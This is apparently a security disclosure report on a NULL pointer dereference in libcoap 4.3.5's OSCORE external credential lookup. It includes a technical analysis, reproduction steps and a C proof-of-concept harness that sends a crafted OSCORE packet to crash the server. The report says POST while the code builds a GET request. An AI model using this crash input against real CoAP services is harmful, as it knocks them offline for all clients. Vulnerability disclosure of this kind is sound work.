╭─ VULN-0003 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: NULL pointer dereference in OSCORE external credential lookup        │
│  crashes the server                                                          │
│                                                                              │
│  Severity: MEDIUM                                                            │
│                                                                              │
│  CVSS Score: 5.9                                                             │
│                                                                              │
│  Target: libcoap 4.3.5 OSCORE (src/oscore/oscore_context.c,                  │
│  src/coap_oscore.c)                                                          │
│                                                                              │
│  Endpoint: CoAP/UDP OSCORE request with an arbitrary OSCORE option key id    │
│                                                                              │
│  Method: POST                                                                │
│                                                                              │
│  CVSS Vector: AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H                            │
│                                                                              │
│  Description                                                                 │
│  When OSCORE credentials are supplied through the external credential        │
│  callback API, `oscore_find_context()` can return a security context while   │
│  leaving the caller's recipient-context pointer NULL if none of the          │
│  recipients in the returned credential set matches the key id from the       │
│  request. The OSCORE request path uses that returned context without         │
│  checking the recipient pointer and dereferences NULL, crashing the CoAP     │
│  process. A single unauthenticated OSCORE packet with an attacker-chosen     │
│  key id triggers it.                                                         │
│                                                                              │
│  Impact                                                                      │
│  A single unauthenticated datagram can terminate the CoAP server process     │
│  (NULL pointer dereference), denying service to all clients until it is      │
│  restarted; libcoap has no isolation between sessions, so the whole service  │
│  goes down. No credentials or prior state are required, but the target       │
│  application must be using the external credential callback API with a       │
│  credential store that can return a recipient set not containing the         │
│  requested key id.                                                           │
│                                                                              │
│  Technical Analysis                                                          │
│  `coap_oscore_decrypt_pdu()` resolves the security context for an incoming   │
│  request with:                                                               │
│                                                                              │
│  ```c                                                                        │
│  osc_ctx = oscore_find_context(session, cose->key_id, &cose->kid_context,    │
│                                NULL, &rcp_ctx);                              │
│  if (!osc_ctx) { /* 4.01 */ }                                                │
│  coap_oscore_session_set_recipient_ctx(session, rcp_ctx);                    │
│  snd_ctx = osc_ctx->sender_context;                                          │
│  if ((rcp_ctx->initial_state == 0 || osc_ctx->rfc8613_b_1_2 == 0) && ...)    │
│  ```                                                                         │
│                                                                              │
│  `oscore_find_context()` has a branch for applications that store            │
│  credentials externally. The callback returns a `coap_oscore_conf_t`, which  │
│  is turned into a context. The recipient selection is:                       │
│                                                                              │
│  ```c                                                                        │
│  if (tmp_ctx->recipient_chain != NULL &&                                     │
│      tmp_ctx->recipient_chain->next_recipient != NULL) {                     │
│    /* iterate; only assign *recipient_ctx when a recipient id matches */     │
│  } else {                                                                    │
│    *recipient_ctx = tmp_ctx->recipient_chain;                                │
│  }                                                                           │
│  tmp_ctx->recipient_chain = *recipient_ctx;                                  │
│  ...                                                                         │
│  return tmp_ctx;                                                             │
│  ```                                                                         │
│                                                                              │
│  With two or more recipients and no match, `*recipient_ctx` is never         │
│  written, so it still holds the caller's initial NULL. The function          │
│  nevertheless returns the non-NULL context. The recipient's reference count  │
│  is managed through `*recipient_ctx` only, so the empty temporary context    │
│  is also left with `recipient_chain == NULL`.                                │
│                                                                              │
│  Back in `coap_oscore_decrypt_pdu()`, the NULL `rcp_ctx` is passed to        │
│  `coap_oscore_session_set_recipient_ctx()` (which returns early for NULL)    │
│  and then dereferenced by `oscore_validate_sender_seq(rcp_ctx, cose)` at     │
│  the `rcp_ctx->initial_state` check, i.e. before any AEAD verification. In   │
│  a normal build this is a read from address 0 and the process dies with      │
│  SIGSEGV; under UBSAN it is reported as `member access within null pointer   │
│  of type 'struct oscore_recipient_ctx_t'`.                                   │
│                                                                              │
│  The same NULL return is possible for a credential set with no recipients    │
│  at all, and the shipped `coap-server` can reach this code path with `-O     │
│  <credential dir>` because it registers `coap_oscore_ctx_find()` as the      │
│  external find handler and loads whatever configuration file matches the     │
│  requested key id.                                                           │
│                                                                              │
│  PoC Description                                                             │
│  1. Register an external OSCORE credential handler with                      │
│  `coap_oscore_register_external_handlers()` whose find callback returns a    │
│  security context (master secret, master salt, sender id) containing either  │
│  no recipients or several recipients, none of which equals the key id in     │
│  the incoming request.                                                       │
│  2. Create a session toward the local server and build a CoAP NON POST PDU   │
│  whose OSCORE option (number 9) declares Partial IV length 1, a one-byte     │
│  Partial IV and the key id `0x01`, followed by an arbitrary payload.         │
│  3. Pass the PDU to `coap_oscore_decrypt_pdu()` (this is what the receive    │
│  path does for any OSCORE request).                                          │
│  4. `oscore_find_context()` returns the callback-supplied context with a     │
│  NULL recipient pointer, and the request path dereferences it in             │
│  `oscore_validate_sender_seq()`, crashing the process with SIGSEGV.          │
│  5. With the fix, the same input produces a 4.01 "Security context not       │
│  found" response and no crash.                                               │
│                                                                              │
│  PoC Code                                                                    │
│  ```c                                                                        │
│  /* Harness: external credential callback returns a context whose            │
│  recipients                                                                  │
│   * do not include the key id carried in the request. */                     │
│  #include "coap3/coap_internal.h"                                            │
│                                                                              │
│  static const char conf_str[] =                                              │
│      "master_secret,hex,\"0102030405060708090a0b0c0d0e0f10\"\n"              │
│      "master_salt,hex,\"9e7ca92223786340\"\n"                                │
│      "sender_id,hex,\"99\"\n"                                                │
│      "recipient_id,hex,\"02\"\n"                                             │
│      "recipient_id,hex,\"03\"\n";                                            │
│                                                                              │
│  static coap_oscore_conf_t *find_cb(const coap_session_t *session,           │
│                                     const coap_bin_const_t *rcpkey_id,       │
│                                     const coap_bin_const_t *ctxkey_id) {     │
│    coap_str_const_t conf = { sizeof(conf_str) - 1, (const uint8_t            │
│  *)conf_str };                                                               │
│    (void)session; (void)rcpkey_id; (void)ctxkey_id;                          │
│    return coap_new_oscore_conf(conf, NULL, NULL, 0);                         │
│  }                                                                           │
│                                                                              │
│  int main(void) {                                                            │
│    coap_startup();                                                           │
│    coap_context_t *ctx = coap_new_context(NULL);                             │
│    coap_oscore_register_external_handlers(ctx, find_cb, NULL);               │
│    coap_debug_set_packet_loss("50%");                                        │
│    coap_debug_set_packet_fail("100%");                                       │
│                                                                              │
│    coap_address_t addr;                                                      │
│    coap_address_init(&addr);                                                 │
│    addr.size = sizeof(struct sockaddr_in);                                   │
│    addr.addr.sin.sin_family = AF_INET;                                       │
│    addr.addr.sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);                   │
│    addr.addr.sin.sin_port = htons(5683);                                     │
│    coap_session_t *session = coap_new_client_session(ctx, NULL, &addr,       │
│  COAP_PROTO_UDP);                                                            │
│                                                                              │
│    /* OSCORE option: PIV length 1 (0x00) plus key id 0x01 */                 │
│    static const uint8_t osc_opt[] = { 0x09, 0x00, 0x01 };                    │
│    static const uint8_t ciphertext[16] = { 0 };                              │
│                                                                              │
│    coap_pdu_t *pdu = coap_pdu_init(COAP_MESSAGE_NON, COAP_REQUEST_CODE_GET,  │
│                                    0x1234, 256);                             │
│    coap_add_token(pdu, 0, NULL);                                             │
│    coap_add_option(pdu, COAP_OPTION_OSCORE, sizeof(osc_opt), osc_opt);       │
│    coap_add_data(pdu, sizeof(ciphertext), ciphertext);                       │
│                                                                              │
│    coap_pdu_t *d = coap_oscore_decrypt_pdu(session, pdu);   /* SIGSEGV       │
│  before the fix */                                                           │
│    if (d) coap_delete_pdu(d);                                                │
│    coap_delete_pdu(pdu);                                                     │
│    coap_session_release(session);                                            │
│    coap_free_context(ctx);                                                   │
│    coap_cleanup();                                                           │
│    return 0;                                                                 │
│  }                                                                           │
│  ```                                                                         │
│                                                                              │
